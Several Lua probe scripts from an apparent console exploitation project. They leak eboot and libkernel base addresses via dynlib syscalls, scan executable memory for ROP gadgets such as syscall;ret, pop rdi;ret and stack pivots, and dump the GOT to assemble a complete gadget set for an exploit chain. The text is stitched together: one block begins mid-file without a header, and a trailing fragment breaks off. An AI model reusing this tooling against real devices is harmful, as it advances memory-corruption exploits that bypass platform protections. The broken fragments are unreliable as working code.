## probes/phase7_heap_exploitation/41s_eboot_deep_scan.lua

```lua
-- CRASH_CLASS: SAFE (read-only)
-- PROBE 41s: deep scan eboot text for missing ROP gadgets
-- From 41r: first 300KB had pop_rax, pop_rsi, pop_rcx, jmp_rax, call_rax
-- MISSING: syscall;ret, pop rdi;ret, pop rdx;ret, stack pivot
-- Scan 0x48000-0x494000 in chunks, report ALL found gadgets
-- Strategy: scan in 0x48000 (288KB) chunks to stay within loader budget

print("=== PROBE 41s: DEEP EBOOT GADGET SCAN ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end

-- Get eboot text base (ASLR)
local sc_dynlib_get_info = make_syscall(593)
local info_buf = memory.alloc(0x200)
for off = 0, 0x1F8, 4 do safe_wd(info_buf + off, 0) end
safe_wd(info_buf, 0x160)
pcall(function() sc_dynlib_get_info(uint64(0), info_buf) end)
local tb_lo = safe_rd(info_buf + 0x108)
local tb_hi = safe_rd(info_buf + 0x10C)
local ts_lo = safe_rd(info_buf + 0x110)
if not tb_lo or not tb_hi then print("FAILED"); return end

local text_hex = string.format("0x%X%08X", tb_hi, tb_lo)
local eboot = uint64(text_hex)
local text_size = ts_lo or 0x494000
print("eboot text: " .. text_hex .. " size=0x" .. string.format("%X", text_size))

-- verify
local t = safe_rd(eboot)
if not t then print("NOT READABLE"); return end
print("")

--------------------------------------------------------------------
-- Scan from 0x48000 to end of text in one pass
-- Focus on the critical missing gadgets but track all
-- Use dword reads (4 bytes each) — ~0x120000 reads for full scan
-- That's a lot. Limit to 0x80000 reads max (~2MB coverage)
--------------------------------------------------------------------
local start_off = 0x48000
local end_off = math.min(text_size, 0x494000)
local max_reads = 0x80000

-- Track gadgets: store first 8 offsets of each type
local g = {
    syscall_ret = {},
    pop_rdi = {},
    pop_rsi = {},
    pop_rdx = {},
    pop_rcx = {},
    pop_rax = {},
    pop_r8 = {},
    jmp_rax = {},
    call_rax = {},
    leave_ret = {},
    xchg_rsp = {},
    -- also search for: pop rdi; pop rsi; ret (multi-pop)
    pop_rdi_rsi = {},
    -- int 0x80 (CD 80) — BSD syscall
    int80 = {},
    -- ret (C3) — just count
    ret_count = 0,
}

local reads = 0
print("scanning 0x" .. string.format("%X", start_off) .. " - 0x" .. string.format("%X", end_off))

for off = start_off, end_off - 4, 4 do
    local dw = safe_rd(eboot + off)
    if dw == nil then
        print("FAULT at eboot+0x" .. string.format("%X", off))
        break
    end
    reads = reads + 1
    if reads >= max_reads then break end

    local b0 = dw % 256
    local b1 = math.floor(dw / 256) % 256
    local b2 = math.floor(dw / 65536) % 256
    local b3 = math.floor(dw / 16777216) % 256

    -- syscall;ret (0F 05 C3) — THE critical gadget
    if b0 == 0x0F and b1 == 0x05 and b2 == 0xC3 and #g.syscall_ret < 8 then
        g.syscall_ret[#g.syscall_ret + 1] = off
    end
    if b1 == 0x0F and b2 == 0x05 and b3 == 0xC3 and #g.syscall_ret < 8 then
        g.syscall_ret[#g.syscall_ret + 1] = off + 1
    end

    -- pop rdi; ret (5F C3)
    if b0 == 0x5F and b1 == 0xC3 and #g.pop_rdi < 8 then
        g.pop_rdi[#g.pop_rdi + 1] = off
    end
    if b1 == 0x5F and b2 == 0xC3 and #g.pop_rdi < 8 then
        g.pop_rdi[#g.pop_rdi + 1] = off + 1
    end
    if b2 == 0x5F and b3 == 0xC3 and #g.pop_rdi < 8 then
        g.pop_rdi[#g.pop_rdi + 1] = off + 2
    end

    -- pop rdx; ret (5A C3)
    if b0 == 0x5A and b1 == 0xC3 and #g.pop_rdx < 8 then
        g.pop_rdx[#g.pop_rdx + 1] = off
    end
    if b1 == 0x5A and b2 == 0xC3 and #g.pop_rdx < 8 then
        g.pop_rdx[#g.pop_rdx + 1] = off + 1
    end
    if b2 == 0x5A and b3 == 0xC3 and #g.pop_rdx < 8 then
        g.pop_rdx[#g.pop_rdx + 1] = off + 2
    end

    -- pop rsi; ret (5E C3) — already have 2, get more
    if b0 == 0x5E and b1 == 0xC3 and #g.pop_rsi < 8 then
        g.pop_rsi[#g.pop_rsi + 1] = off
    end
    if b1 == 0x5E and b2 == 0xC3 and #g.pop_rsi < 8 then
        g.pop_rsi[#g.pop_rsi + 1] = off + 1
    end

    -- pop rax; ret (58 C3)
    if b0 == 0x58 and b1 == 0xC3 and #g.pop_rax < 8 then
        g.pop_rax[#g.pop_rax + 1] = off
    end
    if b1 == 0x58 and b2 == 0xC3 and #g.pop_rax < 8 then
        g.pop_rax[#g.pop_rax + 1] = off + 1
    end

    -- pop r8; ret (41 58 C3)
    if b0 == 0x41 and b1 == 0x58 and b2 == 0xC3 and #g.pop_r8 < 8 then
        g.pop_r8[#g.pop_r8 + 1] = off
    end
    if b1 == 0x41 and b2 == 0x58 and b3 == 0xC3 and #g.pop_r8 < 8 then
        g.pop_r8[#g.pop_r8 + 1] = off + 1
    end

    -- xchg rsp,rax (48 94) or (48 87 E4) or (48 87 C4)
    if b0 == 0x48 and b1 == 0x94 and #g.xchg_rsp < 8 then
        g.xchg_rsp[#g.xchg_rsp + 1] = off
    end
    if b0 == 0x48 and b1 == 0x87 and (b2 == 0xE4 or b2 == 0xC4) and #g.xchg_rsp < 8 then
        g.xchg_rsp[#g.xchg_rsp + 1] = off
    end

    -- mov rsp,rbp; pop rbp; ret = stack pivot via leave;ret (C9 C3)
    if b0 == 0xC9 and b1 == 0xC3 and #g.leave_ret < 8 then
        g.leave_ret[#g.leave_ret + 1] = off
    end
    if b1 == 0xC9 and b2 == 0xC3 and #g.leave_ret < 8 then
        g.leave_ret[#g.leave_ret + 1] = off + 1
    end

    -- jmp rax (FF E0)
    if b0 == 0xFF and b1 == 0xE0 and #g.jmp_rax < 8 then
        g.jmp_rax[#g.jmp_rax + 1] = off
    end

    -- int 0x80 (CD 80)
    if b0 == 0xCD and b1 == 0x80 and #g.int80 < 4 then
        g.int80[#g.int80 + 1] = off
    end

    -- ret count
    if b0 == 0xC3 then g.ret_count = g.ret_count + 1 end
end

print("reads: " .. reads .. " (" .. reads * 4 .. " bytes)")
print("coverage: eboot+0x" .. string.format("%X", start_off) .. " to +0x" .. string.format("%X", start_off + reads * 4))
print("")

--------------------------------------------------------------------
-- Report
--------------------------------------------------------------------
print("=== GADGET RESULTS ===")
print("")

local function report(name, list)
    print(string.format("%-18s: %d", name, #list))
    for j, off in ipairs(list) do
        print(string.format("  eboot+0x%06X", off))
    end
end

report("syscall;ret", g.syscall_ret)
report("pop rdi;ret", g.pop_rdi)
report("pop rdx;ret", g.pop_rdx)
report("pop rsi;ret", g.pop_rsi)
report("pop rax;ret", g.pop_rax)
report("pop rcx;ret", g.pop_rcx)
report("pop r8;ret", g.pop_r8)
report("leave;ret", g.leave_ret)
report("xchg rsp", g.xchg_rsp)
report("jmp rax", g.jmp_rax)
report("int 0x80", g.int80)
print(string.format("ret (total)       : %d", g.ret_count))
print("")

--------------------------------------------------------------------
-- Verify the critical ones
--------------------------------------------------------------------
print("=== VERIFICATION ===")
if #g.syscall_ret > 0 then
    local off = g.syscall_ret[1]
    local b0 = safe_rb(eboot + off)
    local b1 = safe_rb(eboot + off + 1)
    local b2 = safe_rb(eboot + off + 2)
    print(string.format("syscall;ret +0x%X: %02X %02X %02X %s",
        off, b0 or 0, b1 or 0, b2 or 0,
        (b0 == 0x0F and b1 == 0x05 and b2 == 0xC3) and "CONFIRMED" or "MISMATCH"))
else
    print("syscall;ret: NOT FOUND in scanned range")
    print("  need to scan 0x" .. string.format("%X", start_off + reads * 4) .. " to 0x" .. string.format("%X", end_off))
end

if #g.pop_rdi > 0 then
    local off = g.pop_rdi[1]
    local b0 = safe_rb(eboot + off)
    local b1 = safe_rb(eboot + off + 1)
    print(string.format("pop rdi;ret +0x%X: %02X %02X %s",
        off, b0 or 0, b1 or 0,
        (b0 == 0x5F and b1 == 0xC3) and "CONFIRMED" or "MISMATCH"))
else
    print("pop rdi;ret: NOT FOUND in scanned range")
end

if #g.pop_rdx > 0 then
    local off = g.pop_rdx[1]
    local b0 = safe_rb(eboot + off)
    local b1 = safe_rb(eboot + off + 1)
    print(string.format("pop rdx;ret +0x%X: %02X %02X %s",
        off, b0 or 0, b1 or 0,
        (b0 == 0x5A and b1 == 0xC3) and "CONFIRMED" or "MISMATCH"))
else
    print("pop rdx;ret: NOT FOUND in scanned range")
end
print("")

--------------------------------------------------------------------
-- Summary: do we have a complete ROP chain?
--------------------------------------------------------------------
print("=== ROP CHAIN STATUS ===")
local have_all = true
local chain = {
    {"pop rdi;ret", g.pop_rdi},
    {"pop rsi;ret", g.pop_rsi},
    {"pop rdx;ret", g.pop_rdx},
    {"pop rax;ret", g.pop_rax},
    {"syscall;ret", g.syscall_ret},
}
for _, c in ipairs(chain) do
    local status = #c[2] > 0 and string.format("YES (eboot+0x%X)", c[2][1]) or "MISSING"
    if #c[2] == 0 then have_all = false end
    print(string.format("  %-14s %s", c[1], status))
end
-- include the ones from 41r
print("  (also from 41r: pop_rsi at +0xD77D, pop_rax at +0x992)")
print("")
if have_all then
    print("*** COMPLETE ROP GADGET SET AVAILABLE ***")
else
    print("incomplete — need to scan remaining text")
end

print("")
print("=== PROBE 41s COMPLETE ===")
```

```lua
        g_syscall[#g_syscall + 1] = off
    end
    if b1 == 0x0F and b2 == 0x05 and b3 == 0xC3 and #g_syscall < 8 then
        g_syscall[#g_syscall + 1] = off + 1
    end

    -- pop rdx; ret (5A C3)
    if b0 == 0x5A and b1 == 0xC3 and #g_pop_rdx < 8 then
        g_pop_rdx[#g_pop_rdx + 1] = off
    end
    if b1 == 0x5A and b2 == 0xC3 and #g_pop_rdx < 8 then
        g_pop_rdx[#g_pop_rdx + 1] = off + 1
    end
    if b2 == 0x5A and b3 == 0xC3 and #g_pop_rdx < 8 then
        g_pop_rdx[#g_pop_rdx + 1] = off + 2
    end

    -- Also track extras we might want
    if b0 == 0x5F and b1 == 0xC3 and #g_pop_rdi < 4 then
        g_pop_rdi[#g_pop_rdi + 1] = off
    end
    if b0 == 0x5E and b1 == 0xC3 and #g_pop_rsi < 4 then
        g_pop_rsi[#g_pop_rsi + 1] = off
    end
    if b0 == 0x58 and b1 == 0xC3 and #g_pop_rax < 4 then
        g_pop_rax[#g_pop_rax + 1] = off
    end
    if b0 == 0xC9 and b1 == 0xC3 and #g_leave < 4 then
        g_leave[#g_leave + 1] = off
    end
    if b0 == 0x48 and (b1 == 0x94 or (b1 == 0x87 and (b2 == 0xE4 or b2 == 0xC4))) and #g_xchg < 4 then
        g_xchg[#g_xchg + 1] = off
    end
end

print("reads: " .. reads .. " (" .. reads * 4 .. " bytes)")
print("coverage: eboot+0x" .. string.format("%X", start_off) .. " to +0x" .. string.format("%X", start_off + reads * 4))
print("")

print("=== RESULTS ===")
local function report(name, list)
    print(string.format("%-18s: %d", name, #list))
    for _, off in ipairs(list) do
        print(string.format("  eboot+0x%06X", off))
    end
end

report("syscall;ret", g_syscall)
report("pop rdx;ret", g_pop_rdx)
report("pop rdi;ret", g_pop_rdi)
report("pop rsi;ret", g_pop_rsi)
report("pop rax;ret", g_pop_rax)
report("leave;ret", g_leave)
report("xchg rsp", g_xchg)
print("")

-- Verify critical finds
print("=== VERIFICATION ===")
if #g_syscall > 0 then
    local off = g_syscall[1]
    local b0 = safe_rb(eboot + off)
    local b1 = safe_rb(eboot + off + 1)
    local b2 = safe_rb(eboot + off + 2)
    print(string.format("syscall;ret +0x%X: %02X %02X %02X %s",
        off, b0 or 0, b1 or 0, b2 or 0,
        (b0 == 0x0F and b1 == 0x05 and b2 == 0xC3) and "CONFIRMED" or "MISMATCH"))
end
if #g_pop_rdx > 0 then
    local off = g_pop_rdx[1]
    local b0 = safe_rb(eboot + off)
    local b1 = safe_rb(eboot + off + 1)
    print(string.format("pop rdx;ret +0x%X: %02X %02X %s",
        off, b0 or 0, b1 or 0,
        (b0 == 0x5A and b1 == 0xC3) and "CONFIRMED" or "MISMATCH"))
end
print("")

-- Full chain status combining all probes
print("=== FULL ROP CHAIN (all probes) ===")
local chain = {
    {"pop rdi;ret", "eboot+0xC9DFE (41s)"},
    {"pop rsi;ret", "eboot+0xD77D (41r)"},
    {"pop rdx;ret", #g_pop_rdx > 0 and string.format("eboot+0x%X (41t)", g_pop_rdx[1]) or "MISSING"},
    {"pop rax;ret", "eboot+0x992 (41r)"},
    {"syscall;ret", #g_syscall > 0 and string.format("eboot+0x%X (41t)", g_syscall[1]) or "MISSING"},
    {"jmp rax", "eboot+0x84C (41r)"},
    {"xchg rsp", "eboot+0x163874 (41s)"},
}
local complete = true
for _, c in ipairs(chain) do
    print(string.format("  %-14s %s", c[1], c[2]))
    if c[2] == "MISSING" then complete = false end
end
print("")
if complete then
    print("*** COMPLETE ROP GADGET SET ***")
else
    print("still missing gadgets — may need to scan data segments or other modules")
end
print("")
print("=== PROBE 41t COMPLETE ===")
```

## probes/phase7_heap_exploitation/41u_find_syscall_ret.lua

```lua
-- CRASH_CLASS: SAFE (read-only)
-- PROBE 41u: find syscall;ret — the LAST missing gadget
-- 1) Scan eboot tail 0x448000-0x494000
-- 2) Scan ALL module data segments for 0F 05 C3
-- 3) Check eboot PLT/GOT region for syscall stubs

print("=== PROBE 41u: FIND SYSCALL;RET ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end

local sc_dynlib_get_list = make_syscall(592)
local sc_dynlib_get_info = make_syscall(593)

-- Get eboot info
local info_buf = memory.alloc(0x200)
for off = 0, 0x1F8, 4 do safe_wd(info_buf + off, 0) end
safe_wd(info_buf, 0x160)
pcall(function() sc_dynlib_get_info(uint64(0), info_buf) end)
local tb_lo = safe_rd(info_buf + 0x108)
local tb_hi = safe_rd(info_buf + 0x10C)
if not tb_lo or not tb_hi then print("FAILED"); return end
local text_hex = string.format("0x%X%08X", tb_hi, tb_lo)
local eboot = uint64(text_hex)
print("eboot: " .. text_hex)

--------------------------------------------------------------------
-- PART 1: Scan eboot tail 0x448000-0x494000
--------------------------------------------------------------------
print("")
print("--- PART 1: EBOOT TAIL 0x448000-0x494000 ---")
local found = {}
for off = 0x448000, 0x494000 - 4, 4 do
    local dw = safe_rd(eboot + off)
    if dw == nil then
        print("fault at +0x" .. string.format("%X", off))
        break
    end
    local b0 = dw % 256
    local b1 = math.floor(dw / 256) % 256
    local b2 = math.floor(dw / 65536) % 256
    local b3 = math.floor(dw / 16777216) % 256
    if b0 == 0x0F and b1 == 0x05 and b2 == 0xC3 and #found < 8 then
        found[#found + 1] = off
    end
    if b1 == 0x0F and b2 == 0x05 and b3 == 0xC3 and #found < 8 then
        found[#found + 1] = off + 1
    end
end
print("syscall;ret in tail: " .. #found)
for _, off in ipairs(found) do
    local b0 = safe_rb(eboot + off)
    local b1 = safe_rb(eboot + off + 1)
    local b2 = safe_rb(eboot + off + 2)
    print(string.format("  eboot+0x%06X: %02X %02X %02X %s", off,
        b0 or 0, b1 or 0, b2 or 0,
        (b0 == 0x0F and b1 == 0x05 and b2 == 0xC3) and "CONFIRMED" or "mismatch"))
end

--------------------------------------------------------------------
-- PART 2: Scan ALL module data segments
--------------------------------------------------------------------
print("")
print("--- PART 2: MODULE DATA SEGMENTS ---")
local handle_buf = memory.alloc(512)
local num_buf = memory.alloc(8)
pcall(function() sc_dynlib_get_list(handle_buf, uint64(128), num_buf) end)
local num_h = safe_rd(num_buf) or 0

local all_found = {}
for i = 0, math.min(num_h - 1, 38) do
    local h = safe_rd(handle_buf + i * 4)
    if h then
        for off2 = 0, 0x1F8, 4 do safe_wd(info_buf + off2, 0) end
        safe_wd(info_buf, 0x160)
        pcall(function() sc_dynlib_get_info(uint64(h), info_buf) end)
        local name_bytes = {}
        for nb = 0, 31 do
            local c = safe_rb(info_buf + 0x08 + nb)
            if c and c > 0 and c < 128 then name_bytes[#name_bytes + 1] = string.char(c)
            else break end
        end
        local name = table.concat(name_bytes)
        -- data segment is at +0x118/+0x11C base, +0x120 size
        local dl = safe_rd(info_buf + 0x118)
        local dh = safe_rd(info_buf + 0x11C)
        local ds = safe_rd(info_buf + 0x120)
        if dl and dh and ds and ds > 0 then
            local d_hex = string.format("0x%X%08X", dh, dl)
            local daddr = uint64(d_hex)
            local test = safe_rd(daddr)
            if test then
                local sr = 0
                local sr_offs = {}
                local scan_max = math.min(ds, 0x20000)
                for off = 0, scan_max - 4, 4 do
                    local dw = safe_rd(daddr + off)
                    if dw == nil then break end
                    local b0 = dw % 256
                    local b1 = math.floor(dw / 256) % 256
                    local b2 = math.floor(dw / 65536) % 256
                    local b3 = math.floor(dw / 16777216) % 256
                    if b0 == 0x0F and b1 == 0x05 and b2 == 0xC3 then
                        sr = sr + 1
                        if #sr_offs < 4 then sr_offs[#sr_offs + 1] = off end
                    end
                    if b1 == 0x0F and b2 == 0x05 and b3 == 0xC3 then
                        sr = sr + 1
                        if #sr_offs < 4 then sr_offs[#sr_offs + 1] = off + 1 end
                    end
                end
                if sr > 0 then
                    print(string.format("  %-24s data %s: %d syscall;ret!", name, d_hex, sr))
                    for _, soff in ipairs(sr_offs) do
                        local b0 = safe_rb(daddr + soff)
                        local b1 = safe_rb(daddr + soff + 1)
                        local b2 = safe_rb(daddr + soff + 2)
                        print(string.format("    +0x%X: %02X %02X %02X %s",
                            soff, b0 or 0, b1 or 0, b2 or 0,
                            (b0 == 0x0F and b1 == 0x05 and b2 == 0xC3) and "CONFIRMED" or "mismatch"))
                        if b0 == 0x0F and b1 == 0x05 and b2 == 0xC3 then
                            all_found[#all_found + 1] = {name = name, base = d_hex, off = soff}
                        end
                    end
                end
            end
        end
    end
end

if #all_found == 0 then
    print("  no syscall;ret in any data segment")
end

--------------------------------------------------------------------
-- PART 3: Alternative — scan for int 0x80; ret (CD 80 C3)
-- or syscall alone (0F 05) without ret
--------------------------------------------------------------------
print("")
print("--- PART 3: ALTERNATIVES ---")
-- scan eboot for bare syscall (0F 05) — maybe followed by nop;ret or pop;ret
local bare = {}
for off = 0x0, 0x48000 - 4, 4 do
    local dw = safe_rd(eboot + off)
    if dw == nil then break end
    local b0 = dw % 256
    local b1 = math.floor(dw / 256) % 256
    local b2 = math.floor(dw / 65536) % 256
    local b3 = math.floor(dw / 16777216) % 256
    if b0 == 0x0F and b1 == 0x05 and #bare < 8 then
        bare[#bare + 1] = {off = off, next1 = b2, next2 = b3}
    end
    if b1 == 0x0F and b2 == 0x05 and #bare < 8 then
        bare[#bare + 1] = {off = off + 1, next1 = b3, next2 = nil}
    end
end
print("bare syscall (0F 05) in eboot first 300KB: " .. #bare)
for _, b in ipairs(bare) do
    -- read the byte after to see context
    local after = safe_rb(eboot + b.off + 2) or 0
    local after2 = safe_rb(eboot + b.off + 3) or 0
    print(string.format("  eboot+0x%06X: 0F 05 %02X %02X", b.off, after, after2))
end

print("")
print("=== FINAL ROP CHAIN STATUS ===")
local sr_source = "MISSING"
if #found > 0 then
    sr_source = string.format("eboot+0x%X (tail)", found[1])
end
if sr_source == "MISSING" and #all_found > 0 then
    local f = all_found[1]
    sr_source = string.format("%s data+0x%X", f.name, f.off)
end

local chain = {
    {"pop rdi;ret", "eboot+0xC9DFE"},
    {"pop rsi;ret", "eboot+0xD77D"},
    {"pop rdx;ret", "eboot+0x420E6D"},
    {"pop rax;ret", "eboot+0x992"},
    {"syscall;ret", sr_source},
    {"jmp rax", "eboot+0x84C"},
    {"xchg rsp", "eboot+0x163874"},
    {"leave;ret", "eboot+0x37FDE0"},
}
local complete = true
for _, c in ipairs(chain) do
    print(string.format("  %-14s %s", c[1], c[2]))
    if c[2] == "MISSING" then complete = false end
end
print("")
if complete then
    print("*** COMPLETE ROP GADGET SET ***")
else
    print("syscall;ret not in eboot — need libkernel text or alternative trigger")
end

print("")
print("=== PROBE 41u COMPLETE ===")
```

## probes/phase7_heap_exploitation/41v_got_dump.lua

```lua
-- CRASH_CLASS: SAFE (read-only)
-- PROBE 41v: dump eboot GOT to find libkernel function pointers
-- Goal: find resolved PLT entries pointing into libkernel text,
-- then calculate where syscall;ret lives based on known offsets
--
-- FreeBSD syscall wrappers are typically:
--   mov $SYS_xxx, %eax   ; B8 XX 00 00 00
--   mov %rcx, %r10       ; 49 89 CA
--   syscall               ; 0F 05
--   jb cerror             ; 72 XX
--   ret                   ; C3
-- So syscall is at func+8, but "0F 05 C3" won't appear due to the jb.
-- HOWEVER: unaligned reads across function boundaries, or internal
-- helpers like __syscall, may contain the raw 0F 05 C3 sequence.
-- We also look for the Lua loader's own syscall stub address.

print("=== PROBE 41v: EBOOT GOT DUMP ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function qw_hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%X%08X", v.h, v.l), v.h, v.l
    end
    local n = to_num(v)
    return string.format("0x%X", n), 0, n
end

local sc_dynlib_get_list = make_syscall(592)
local sc_dynlib_get_info = make_syscall(593)
local info_buf = memory.alloc(0x200)

--------------------------------------------------------------------
-- Get module bases
--------------------------------------------------------------------
-- eboot (handle 0)
for off = 0, 0x1F8, 4 do safe_wd(info_buf + off, 0) end
safe_wd(info_buf, 0x160)
pcall(function() sc_dynlib_get_info(uint64(0), info_buf) end)
local eb_tl = safe_rd(info_buf + 0x108)
local eb_th = safe_rd(info_buf + 0x10C)
local eb_ts = safe_rd(info_buf + 0x110)
local eb_dl = safe_rd(info_buf + 0x118)
local eb_dh = safe_rd(info_buf + 0x11C)
local eb_ds = safe_rd(info_buf + 0x120)

local eboot_text = uint64(string.format("0x%X%08X", eb_th, eb_tl))
local eboot_data = uint64(string.format("0x%X%08X", eb_dh, eb_dl))
print("eboot text: " .. string.format("0x%X%08X", eb_th, eb_tl) .. " sz=0x" .. string.format("%X", eb_ts))
print("eboot data: " .. string.format("0x%X%08X", eb_dh, eb_dl) .. " sz=0x" .. string.format("%X", eb_ds))

-- Get ALL module text ranges for classification
local handle_buf = memory.alloc(512)
local num_buf = memory.alloc(8)
pcall(function() sc_dynlib_get_list(handle_buf, uint64(128), num_buf) end)
local num_h = safe_rd(num_buf) or 0

local mod_ranges = {}
for i = 0, math.min(num_h - 1, 38) do
    local h = safe_rd(handle_buf + i * 4)
    if h then
        for off = 0, 0x1F8, 4 do safe_wd(info_buf + off, 0) end
        safe_wd(info_buf, 0x160)
        pcall(function() sc_dynlib_get_info(uint64(h), info_buf) end)
        local name_bytes = {}
        for nb = 0, 31 do
            local c = safe_rb(info_buf + 0x08 + nb)
            if c and c > 0 and c < 128 then name_bytes[#name_bytes + 1] = string.char(c)
            else break end
        end
        local tl = safe_rd(info_buf + 0x108) or 0
        local th = safe_rd(info_buf + 0x10C) or 0
        local ts = safe_rd(info_buf + 0x110) or 0
        mod_ranges[#mod_ranges + 1] = {
            name = table.concat(name_bytes),
            handle = h,
            text_lo_h = th, text_lo_l = tl,
            text_size = ts,
        }
    end
end

-- Helper: classify a 64-bit address
local function classify(hi, lo)
    for _, m in ipairs(mod_ranges) do
        if hi == m.text_lo_h then
            local diff = lo - m.text_lo_l
            if diff >= 0 and diff < m.text_size then
                return m.name, diff
            end
        end
    end
    return nil, 0
end

print("")
print("modules: " .. #mod_ranges)

-- Find libkernel specifically
local lk_th, lk_tl, lk_ts = 0, 0, 0
local lk_name = ""
for _, m in ipairs(mod_ranges) do
    if m.name:find("kernel") then
        lk_th = m.text_lo_h
        lk_tl = m.text_lo_l
        lk_ts = m.text_size
        lk_name = m.name
        break
    end
end
print("libkernel: " .. string.format("0x%X%08X", lk_th, lk_tl) .. " sz=0x" .. string.format("%X", lk_ts))
print("")

--------------------------------------------------------------------
-- PART 1: Scan eboot data segment for GOT entries
-- GOT is usually at the start of data segment
-- Look for qwords pointing into any module's text
--------------------------------------------------------------------
print("--- PART 1: GOT SCAN ---")

local got_entries = {}
local lk_entries = {}
local scan_size = math.min(eb_ds, 0x40000) -- scan first 256KB of data

for off = 0, scan_size - 8, 8 do
    local q = safe_rq(eboot_data + off)
    if q == nil then break end
    local hex, hi, lo = qw_hex(q)
    local mname, moff = classify(hi, lo)
    if mname then
        got_entries[#got_entries + 1] = {off = off, name = mname, func_off = moff, hi = hi, lo = lo}
        if mname:find("kernel") then
            lk_entries[#lk_entries + 1] = {off = off, func_off = moff, addr_hex = hex}
        end
    end
end

print("total GOT entries pointing to module text: " .. #got_entries)

-- Count per module
local per_mod = {}
for _, e in ipairs(got_entries) do
    per_mod[e.name] = (per_mod[e.name] or 0) + 1
end
for name, count in pairs(per_mod) do
    print(string.format("  %-28s %d entries", name, count))
end
print("")

--------------------------------------------------------------------
-- PART 2: libkernel GOT entries — these give us function offsets
--------------------------------------------------------------------
print("--- PART 2: LIBKERNEL GOT ENTRIES ---")
print("(offset from libkernel text base)")
print("")

-- Sort by func_off
table.sort(lk_entries, function(a, b) return a.func_off < b.func_off end)

for i, e in ipairs(lk_entries) do
    print(string.format("  data+0x%05X -> libkernel+0x%05X (%s)",
        e.off, e.func_off, e.addr_hex))
end
print("")
print("libkernel entries: " .. #lk_entries)
print("")

--------------------------------------------------------------------
-- PART 3: For each libkernel function, the syscall instruction
-- is typically at func+8 in FreeBSD wrappers:
--   B8 XX 00 00 00   mov eax, SYS_xxx  (5 bytes)
--   49 89 CA         mov r10, rcx       (3 bytes)
--   0F 05            syscall            (2 bytes)
--   72 XX            jb cerror          (2 bytes)
--   C3               ret                (1 byte)
--
-- So: func+10 = 0F 05 (syscall)
--     func+12 = 72 XX (jb)
--     func+14 = C3 (ret) if no cerror needed (leaf error)
--
-- For __syscall itself: just "syscall; ret" = 0F 05 C3
-- This is at some fixed offset. Look for functions with small offsets
-- (likely __syscall or similar primitives)
--------------------------------------------------------------------
print("--- PART 3: CANDIDATE SYSCALL;RET OFFSETS ---")
print("")
print("In FreeBSD, the raw __syscall helper is typically:")
print("  0F 05 C3  (syscall; ret)")
print("at a small offset in libkernel text.")
print("")

-- Look for notable offsets — very small ones are likely primitives
-- Also: func+10 has the syscall for standard wrappers
-- And func+12 might be the start of another function that's C3-prefixed

-- Candidates for syscall;ret:
-- Any libkernel function where offset+10 has 0F 05,
-- and the NEXT function starts with C3 (ret) — creating 0F 05 C3 across boundary
-- Or: internal __syscall at a low offset

print("known function offsets (sorted):")
local unique_offs = {}
local seen = {}
for _, e in ipairs(lk_entries) do
    if not seen[e.func_off] then
        seen[e.func_off] = true
        unique_offs[#unique_offs + 1] = e.func_off
    end
end
table.sort(unique_offs)

for i, off in ipairs(unique_offs) do
    -- Mark potential syscall position
    local sc_at = off + 10
    print(string.format("  func at +0x%04X, syscall likely at +0x%04X", off, sc_at))
    -- check if sc_at+2 (= off+12) is close to another function start
    -- which would mean 0F 05 [next func byte]
end
print("")

--------------------------------------------------------------------
-- PART 4: Check if any pair of functions creates 0F 05 C3 boundary
-- func_A has syscall at A+10 (bytes 0F 05), then A+12 has jb (72 XX)
-- But if func_B starts at A+12 with C3... that creates 0F 05 C3
-- at address A+10. Check consecutive function pairs.
--------------------------------------------------------------------
print("--- PART 4: CROSS-FUNCTION BOUNDARY CHECK ---")
for i = 1, #unique_offs - 1 do
    local a = unique_offs[i]
    local b = unique_offs[i + 1]
    local gap = b - a
    -- standard wrapper: 5 + 3 + 2 + 2 + 1 = 13 bytes (0x0D)
    -- so b = a + 0x10 (16-byte aligned) or a + 0x0D or similar
    if gap <= 0x20 then
        -- if a+10 has syscall, and a+12 == b, then b starts at jb position
        -- OR if a+10 has syscall, and b = a+12, first byte of b could be anything
        print(string.format("  funcs +0x%04X and +0x%04X, gap=%d, syscall@+0x%04X, gap_from_sc=%d",
            a, b, gap, a + 10, b - (a + 10)))
    end
end
print("")

--------------------------------------------------------------------
-- PART 5: Try the obvious — look for __syscall primitive
-- It's typically one of the first functions. Small offset.
-- The pattern: if offset 0x0000 or 0x0010 is just syscall;ret
-- Try known FreeBSD offsets: 0, 8, 16, etc.
-- We can't READ these, but we can CALL them via ROP.
-- Print candidate addresses for blind testing.
--------------------------------------------------------------------
print("--- PART 5: BLIND CANDIDATES ---")
```

```lua
            else break end

                    local _, qh, ql = qw_hex(q)

